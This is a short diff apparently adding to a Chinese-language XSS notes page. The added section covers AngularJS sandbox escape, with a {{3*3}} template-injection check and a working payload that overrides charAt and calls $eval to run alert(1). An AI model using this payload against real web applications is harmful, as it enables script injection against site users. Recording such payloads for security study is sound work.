@@ -15,6 +15,14 @@ tag:
   - XSS
 comment: false
 ---
+AngularJS沙箱逃逸
+```
+验证：
+  {{3*3}}
+
+payload:
+  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+```
 
 script、input中：
 
